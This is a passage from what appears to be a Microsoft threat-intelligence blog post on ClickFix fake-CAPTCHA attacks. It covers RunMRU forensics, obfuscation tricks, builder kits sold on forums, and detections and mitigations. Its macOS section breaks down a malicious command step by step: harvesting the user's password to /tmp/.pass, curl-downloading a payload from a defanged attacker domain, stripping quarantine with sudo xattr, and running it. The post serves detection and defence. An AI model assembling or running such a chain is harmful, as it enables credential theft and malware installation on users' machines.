-&lt;p class="wp-block-paragraph"&gt;The Windows &lt;em&gt;Run&lt;/em&gt; dialog (&lt;em&gt;Win&lt;/em&gt; + &lt;em&gt;R&lt;/em&gt;) is a trusted shell input user interface (UI) that’s part of Windows Explorer (&lt;em&gt;explorer.exe&lt;/em&gt;). Internally, it uses &lt;em&gt;ShellExecute&lt;/em&gt; or &lt;em&gt;CreateProcess&lt;/em&gt; APIs to resolve and launch commands. The input is limited to &lt;em&gt;MAX_PATH&lt;/em&gt;, requiring a null-terminated string (&lt;em&gt;\0&lt;/em&gt;) with a practical maximum of 259 characters. Additionally, as part of the &lt;em&gt;Run&lt;/em&gt; dialog, Windows loads &lt;em&gt;tiptsf.dll&lt;/em&gt; module in &lt;em&gt;explorer.exe&lt;/em&gt;. This DLL file is related to the Text Services Framework (TSF), which provides input processor interface.&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of Windows Run" class="wp-image-141868 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig24-Windows-Run-dialog-box.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 24. The Windows Run dialog box&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Entering commands into the &lt;em&gt;Run&lt;/em&gt; dialog leaves forensic traces—most notably in the &lt;em&gt;RunMRU&lt;/em&gt;(Most Recently Used) registry key. This key keeps a history of &lt;em&gt;Run&lt;/em&gt; dialog executions and can be used to reconstruct user-initiated activity during investigations. Note that it doesn’t create a registry entry if the process execution fails.&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of registry" class="wp-image-141869 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig25-RunMRU-registry.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 25. RunMRU registry key entry with a malicious ClickFix command&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;To determine if a ClickFix command execution is potentially occurring in the environment, one can check the RunMRU entries if they include signs pointing to LOLBins—such as &lt;em&gt;powershell&lt;/em&gt;, &lt;em&gt;mshta&lt;/em&gt;, &lt;em&gt;rundll32&lt;/em&gt;, &lt;em&gt;wscript&lt;/em&gt;, &lt;em&gt;curl&lt;/em&gt;, and &lt;em&gt;wget&lt;/em&gt;—that can execute code and/or download payloads. PowerShell continues to be the most leveraged native binary, with cmdlets such as &lt;em&gt;iwr&lt;/em&gt; (&lt;em&gt;Invoke-WebRequest&lt;/em&gt;), &lt;em&gt;irm&lt;/em&gt; (&lt;em&gt;Invoke-RestMethod&lt;/em&gt;), and &lt;em&gt;iex&lt;/em&gt; (&lt;em&gt;Invoke-Expression&lt;/em&gt;) being very prolific.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;&amp;nbsp;Additional suspicious elements to check in entries within the &lt;em&gt;RunRMU&lt;/em&gt; registry key include the following:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;First-stage payloads are often hosted by direct IP addresses, content delivery network (CDN) domains, interesting top-level domains (for example, &lt;em&gt;.live&lt;/em&gt;,&lt;em&gt;. shop&lt;/em&gt;, &lt;em&gt;.icu&lt;/em&gt;), or code-sharing platforms such as pastes.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;First-stage payloads are often delivered and/or launched as specific file type such as &lt;em&gt;.html&lt;/em&gt;, &lt;em&gt;.hta&lt;/em&gt;, &lt;em&gt;.txt&lt;/em&gt;, &lt;em&gt;.zip&lt;/em&gt;, &lt;em&gt;.msi&lt;/em&gt;, &lt;em&gt;.bat&lt;/em&gt;, &lt;em&gt;.ps1&lt;/em&gt;, or &lt;em&gt;.vbs&lt;/em&gt;&lt;ul&gt;&lt;li&gt;The file type of the scripts might be renamed to media extensions (such as &lt;em&gt;.png&lt;/em&gt;, &lt;em&gt;.mp3&lt;/em&gt;, &lt;em&gt;.mp4&lt;/em&gt;, &lt;em&gt;.wav&lt;/em&gt;, and &lt;em&gt;.jpg&lt;/em&gt;) to hide their true intent.&lt;/li&gt;&lt;/ul&gt;
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;The file type might employ double file extension for evasion (for example, &lt;em&gt;file.hta.mp4&lt;/em&gt;)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;URLs are often shortened using shorteners such as Bitly.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;A fake reCAPTCHA, CAPTCHA, or Turnstile confirmation is included, such as the following:&lt;ul&gt;&lt;li&gt;✅ “I am not a robot &amp;#8211; reCAPTCHA Verification ID: XXXX”&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;# # I am not a robot: CAPTCHA Verification UID: XXXX\&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;# “Human, not a robot: CAPTCHA: Verification ID: XXXX”&lt;/li&gt;&lt;/ul&gt;
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;✔️ “Cloud identificator:XXXX”&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of ClickFix commands" class="wp-image-141870 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig26-Generic-ClickFix-commands.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 26. Examples of generic ClickFix commands&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="obfuscation-and-execution-techniques-for-defense-evasion"&gt;Obfuscation and execution techniques for defense evasion&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The command examples in the previous section aren’t all encompassing, as we’ve observed threat actors employing a growing number of obfuscation and execution techniques for defense evasion. These techniques include nested execution chains, proxy command abuse, encoding schemes such as Base64, use of string concatenation/fragmentation, and escaped characters, among others.&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of ClickFix command" class="wp-image-141871 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig27-ClickFix-command.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 27. Example of a ClickFix command that was using nested PowerShell, string obfuscation through concatenated ampersand (&amp;ldquo;&amp;amp;&amp;rdquo;) delimiters, and benign sounding phrase (for example, &amp;ldquo;Microsoft Defender Services Secure Access&amp;rdquo;)&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of ClickFix command" class="wp-image-141872 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig28-ClickFix-command.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 28. Example of a ClickFix command that was using LOLBIN stacking (repeated cmd.exe) and obfuscation through escape characters (^)&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of ClickFix command" class="wp-image-141873 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig29-ClickFix-command.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 29. Example of a ClickFix command that was obfuscated using string splitting and concatenation, indexed character access through the $1 command string, and ampersand execution&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="beyond-windows-clickfix-targeting-macos-users"&gt;Beyond Windows: ClickFix targeting macOS users&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;In June 2025, a ClickFix campaign was &lt;a href="https://www.cloudsek.com/blog/amos-variant-distributed-via-clickfix-in-spectrum-themed-dynamic-delivery-campaign-by-russian-speaking-hackers"&gt;reported&lt;/a&gt; to be targeting macOS users to deliver Atomic macOS Stealer (AMOS). This new campaign is yet another mark in the continuously evolving threat landscape, as the ClickFix technique was previously observed to be more common in Windows-based attacks.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The campaign, which according to our analysis goes back to late May 2025, redirected target users to Clickfix-themed delivery websites that were impersonating Spectrum, a US-based company that provides services for cable television, internet access, and unified communications:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of fake CAPTCHA" class="wp-image-141874 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig30-ClickFix-landing-page.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 30. ClickFix landing page with a fake CAPTCHA&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Like any other ClickFix campaign, when the user clicks the &lt;strong&gt;Alternate verification&lt;/strong&gt; button, the page displays instructions the user has to follow to “fix” their issue. Interestingly, the steps the lure displays even on macOS users are for Windows devices:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of ClickFix instructions" class="wp-image-141875 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig31-ClickFix-instructions.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 31. ClickFix instructions presented to the target user&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Meanwhile, in the background, a malicious command is copied to the user’s clipboard. The command that is copied is different for macOS and Windows devices.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Windows:&lt;/strong&gt;&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of ClickFix commands on Windows" class="wp-image-141876 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig32-ClickFix-command.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 32. Screenshot of the ClickFix command copied on Windows devices&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;macOS:&lt;/strong&gt;&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of ClickFix commands on macOS" class="wp-image-141877 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig33-ClickFix-command.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 33. Screenshot of the ClickFix command copied on macOS devices&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The command that’s copied for macOS devices instructs the system to perform the following actions:&lt;/p&gt;
-
-
-
-&lt;ol class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;&lt;strong&gt;Get current user:&lt;/strong&gt; &lt;em&gt;username=$(whoami)&lt;/em&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;strong&gt;Prompt for the correct password: &lt;/strong&gt;Continuously prompt &lt;em&gt;System Password:&lt;/em&gt; until the user enters the correct password&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;strong&gt;Validate password:&lt;/strong&gt; Use &lt;em&gt;dscl . -authonly&lt;/em&gt; to verify the password against macOS directory services&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;strong&gt;Store password:&lt;/strong&gt; Save the valid password to the &lt;em&gt;/tmp/.pass&lt;/em&gt; file&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;strong&gt;Download payload:&lt;/strong&gt; &lt;em&gt;curl -o /tmp/update hxxps[:]//applemacios[.]com/getrur/update&lt;/em&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;strong&gt;Remove quarantine:&lt;/strong&gt; Use the stolen password with &lt;em&gt;sudo -S xattr -c&lt;/em&gt; to bypass macOS security&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;strong&gt;Make an executable file:&lt;/strong&gt; &lt;em&gt;chmod +x /tmp/update&lt;/em&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;strong&gt;Launch the malware:&lt;/strong&gt; Run the downloaded file&lt;em&gt; /tmp/update&lt;/em&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The file saved as &lt;em&gt;update&lt;/em&gt; within the &lt;em&gt;tmp&lt;/em&gt; directory belongs to the AMOS malware family. AMOS variants such as Poseidon and Odyssey are known to steal user information, including browser cookies, passwords, and cryptocurrency wallet credentials.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="behind-the-click-clickfix-kits-and-other-services-for-sale"&gt;Behind the click: ClickFix kits and other services for sale&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Threat Intelligence has observed several threat actors selling the ClickFix builders (also called &amp;#8220;Win + R&amp;#8221;) on popular hacker forums since late 2024. Some of these actors are bundling ClickFix builders into their existing kits that already generate various files such as LNK, JavaScript, and SVG files. The kits offer creation of landing pages with a variety of available lures including Cloudflare. They also offer construction of malicious commands that users will paste into the Windows &lt;em&gt;Run&lt;/em&gt; dialog. These kits claim to guarantee antivirus and web protection bypass (some even promise that they can bypass &lt;a href="https://learn.microsoft.com/en-us/windows/security/operating-system-security/virus-and-threat-protection/microsoft-defender-smartscreen/"&gt;Microsoft Defender SmartScreen&lt;/a&gt;), as well as payload persistence. The cost of subscription to such a service might be between US$200 to US$1,500 per month. We’ve also discovered sellers that offer one-time and piece-meal solutions (for example, only the source code, landing page, or the command line) priced anywhere between US$200 and US$500.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Figures 34 and 35 show an example of a ClickFix builder that offers a variety of configurable options such as:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;Displaying a decoy PDF file after a target user is phished&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Payload execution timing&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Virtual machine (VM) detection and evasion (“Anti VM”) and user access control (UAC) bypass&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Visual template to be used, such as Google Meet, Google CAPTCHA, or Cloudflare&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Language to be used, for example, English, German, Spanish, French, Italian, or Portuguese&lt;/li&gt;
-&lt;/ul&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of a ClickFix builder, taken from the seller&amp;rsquo;s demo video" class="wp-image-141878 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig34-ClickFix-builder.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 34. Screenshot of a ClickFix builder, taken from the seller&amp;rsquo;s demo video&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of a ClickFix builder, taken from the seller's demo video" class="wp-image-141879 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig35-ClickFix-builder.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 35. Another screenshot of a ClickFix builder, taken from the seller&amp;#8217;s demo video&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="clickfix-protection-and-detection"&gt;ClickFix protection and detection&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;a href="https://www.microsoft.com/en-us/security/business/solutions/extended-detection-response-xdr"&gt;Microsoft Defender XDR&lt;/a&gt; offers comprehensive coverage for ClickFix attacks by leveraging a range of available technologies across different attack layers. For example, Microsoft Defender SmartScreen displays a warning to Microsoft Edge users when they visit a ClickFix landing page:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of Microsoft Defender SmartScreen flagging a ClickFix landing page" class="wp-image-141880 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig36-SmartScreen.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 36. Microsoft Defender SmartScreen flagging a ClickFix landing page&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Even if a user chooses to bypass the SmartScreen warning or is using a different web browser and is socially engineered to execute a command in the &lt;em&gt;Run&lt;/em&gt; dialog, &lt;a href="https://www.microsoft.com/en-us/security/business/endpoint-security/microsoft-defender-endpoint"&gt;Microsoft Defender for Endpoint&lt;/a&gt; detects and mitigates the attacks initial access activities like the suspicious process execution and command-line activity during the process scan phase.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Most attack paths eventually lead to the execution of either PowerShell or HTA scripts. Microsoft’s &lt;a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal#purpose"&gt;Antimalware Scan Interface (AMSI)&lt;/a&gt; provides scanning capabilities for both scripting environments and PowerShell applications. Defender’s &lt;a href="https://learn.microsoft.com/en-us/defender-endpoint/cloud-protection-microsoft-defender-antivirus"&gt;Cloud Protection&lt;/a&gt; delivers enhanced protection by monitoring and intercepting outgoing connections to malicious URLs as well as analyzing process execution patterns. Additionally, &lt;a href="https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-defender-office-365"&gt;Microsoft Defender for Office 365&lt;/a&gt; analyzes end-to-end links and HTML attachments, and has fake CAPTCHA behavioral signatures that proactively block ClickFix-related phishing emails.&lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="additional-attack-chain-coverage-with-network-protection"&gt;Additional attack chain coverage with network protection&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;In early 2025, Microsoft Defender Experts observed thousands of devices being affected by a ClickFix attack (that is, the ClickFix command was executed by a user on the device) per month, even with an endpoint detection and response (EDR) solution enabled. Due to this, our researchers performed pattern-of-life analysis to follow the tactics, techniques, and procedures (TTPs) in the attack timeline and understand the gaps that can be filled so that the attack could be stopped at the initial access stage. Their research resulted in the automation of the analysis and collection of numerous obfuscated/encoded LOLBin commands observed in the &lt;em&gt;RunMRU&lt;/em&gt; registry, and they were able to successfully extract and block newly created malicious domainsthrough Defender for Endpoint’s &lt;a href="https://learn.microsoft.com/en-us/defender-endpoint/network-protection"&gt;network protection feature&lt;/a&gt;. This feature is an important component on the protection against ClickFix because blocking the C2 domains early in the attack chain prevents the download and/or execution of first-stage payloads, effectively making the attack unsuccessful.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="recommendations"&gt;Recommendations&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Threat Intelligence recommends the following mitigations to reduce the impact of this threat.&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;Educate users to identify social engineering attacks.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Ensure users are aware of what they copy and paste.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Check your Microsoft 365 email filtering settings to ensure spoofed emails, spam, and emails with malware are blocked. Use &lt;a href="https://learn.microsoft.com/defender-office-365/mdo-about"&gt;Microsoft Defender for Office 365&lt;/a&gt; for enhanced phishing protection and coverage against new threats and polymorphic variants. Configure Defender for Office 365 to &lt;a href="https://learn.microsoft.com/defender-office-365/safe-links-about"&gt;recheck links on click&lt;/a&gt; and &lt;a href="https://learn.microsoft.com/defender-office-365/zero-hour-auto-purge"&gt;delete sent mail&lt;/a&gt; in response to newly acquired threat intelligence. Turn on &lt;a href="https://learn.microsoft.com/defender-office-365/safe-attachments-about"&gt;safe attachments policies&lt;/a&gt; to check attachments to inbound email.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Consider using &lt;a href="https://learn.microsoft.com/deployedge/microsoft-edge-for-business"&gt;enterprise-managed browsers&lt;/a&gt;, which provide multiple security features including security update requirements and &lt;a href="https://learn.microsoft.com/deployedge/microsoft-edge-for-business-config-recommendations"&gt;data compliance policies&lt;/a&gt;.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Block web pages from automatically running Flash plugins.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Enable &lt;a href="https://learn.microsoft.com/defender-endpoint/network-protection"&gt;network protection&lt;/a&gt; and &lt;a href="https://learn.microsoft.com/defender-endpoint/web-protection-overview"&gt;web protection&lt;/a&gt; in Microsoft Defender for Endpoint to safeguard against malicious sites and internet-based threats.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Encourage users to use Microsoft Edge and other web browsers that support &lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/web-protection-overview?ocid=magicti_ta_learndoc"&gt;Microsoft Defender SmartScreen&lt;/a&gt;, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Turn on &lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/configure-block-at-first-sight-microsoft-defender-antivirus?ocid=magicti_ta_learndoc"&gt;cloud-delivered protection&lt;/a&gt; in Microsoft Defender Antivirus, or the equivalent for your antivirus product, to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Enable PowerShell &lt;a href="https://learn.microsoft.com/en-us/powershell/scripting/security/security-features?view=powershell-7.5"&gt;script block logging&lt;/a&gt; to detect and analyze obfuscated or encoded commands, providing visibility into malicious script execution that might otherwise evade traditional logging.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Use PowerShell &lt;a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.5"&gt;execution policies&lt;/a&gt; such as setting &lt;em&gt;AllSigned&lt;/em&gt; or &lt;em&gt;RemoteSigned &lt;/em&gt;tohelp reduce the risk of malicious execution by ensuring only trusted, signed scripts are executed, adding a layer of control.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Use Group Policy to deploy hardening configurations throughout your environment, if certain features are not necessary:&lt;ul&gt;&lt;li&gt;Disable the &lt;em&gt;Run&lt;/em&gt; dialog box (&lt;em&gt;Win + R&lt;/em&gt;) key and remove the &lt;em&gt;Run&lt;/em&gt; option from the &lt;em&gt;Start&lt;/em&gt; Menu by selecting &lt;strong&gt;User Configuration&lt;/strong&gt; &amp;gt; &lt;strong&gt;Administrative Templates&lt;/strong&gt; &amp;gt; &lt;strong&gt;Start Menu and Taskbar&lt;/strong&gt; &amp;gt; &lt;strong&gt;Remove Run menu from Start Menu&lt;/strong&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Create an &lt;a href="https://learn.microsoft.com/windows/security/application-security/application-control/app-control-for-business/appcontrol-and-applocker-overview"&gt;App Control policy&lt;/a&gt; that prohibits the launch of native Windows binaries from &lt;em&gt;Run&lt;/em&gt;. This can be accomplished by defining a rule based on the specific process that is launching binaries like PowerShell.&lt;/li&gt;&lt;/ul&gt;
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://learn.microsoft.com/windows/terminal/group-policy"&gt;Configure Windows Terminal&lt;/a&gt; access and settings &lt;a href="https://learn.microsoft.com/windows/terminal/customize-settings/interaction"&gt;to warn users when the text they’re pasting contains multiple lines&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Defender XDR customers can also implement the following &lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-deployment-implement"&gt;attack surface reduction rules&lt;/a&gt; to harden an environment against PowerShell techniques used by threat actors:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference"&gt;Block execution of potentially obfuscated scripts&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference"&gt;Block executable files from running unless they meet a prevalence, age, or trusted list criterion&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference"&gt;Block JavaScript or VBScript from launching downloaded executable content&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="microsoft-defender-xdr-detections"&gt;Microsoft Defender XDR detections&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Customers with provisioned access can also use &lt;a href="https://learn.microsoft.com/en-us/defender-xdr/security-copilot-in-microsoft-365-defender"&gt;Microsoft Security Copilot in Microsoft Defender&lt;/a&gt; to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Defender Antivirus&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Defender Antivirus detects this threat as the following malware:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Behavior:Win32/ClickFix.ZAB"&gt;Behavior:Win32/ClickFix&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Behavior:Win32/ClickFix.ZAB"&gt;Behavior:Win32/SuspClickFix&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:Win32/ClickFix.SEC"&gt;Trojan:Win32/ClickFix&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Trojan:Script/ClickFix&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Behavior:Win32/RegRunMRU.SA"&gt;Behavior:Win32/RegRunMRU&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:HTML/FakeCaptcha!rfn"&gt;Trojan:HTML/FakeCaptcha&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="microsoft-defender-for-endpoint"&gt;Microsoft Defender for Endpoint&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The following Microsoft Defender for Endpoint alerts might also indicate threat activity related to this threat. Note, however, that these alerts can be also triggered by unrelated threat activity:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;Suspicious command in RunMRU registry&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Use of living-off-the-land binary to run malicious code&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Suspicious process executed PowerShell command&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Suspicious PowerShell command line&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Suspicious &amp;#8216;SuspClickFix&amp;#8217; behavior was blocked&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;An active &amp;#8216;SuspDown&amp;#8217; malware was prevented from executing via AMSI&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Suspicious &amp;#8216;MaleficAms&amp;#8217; behavior was blocked&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;An active &amp;#8216;ClickFix&amp;#8217; malware in a command line was prevented from executing&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&amp;#8216;ClickFix&amp;#8217; malware was prevented&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Information stealing malware activity&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Powershell made a suspicious network connection&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Suspicious process launch by Rundll32.exe&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Suspicious Rundll32 command-line&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Suspicious Scheduled Task Process Launched&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
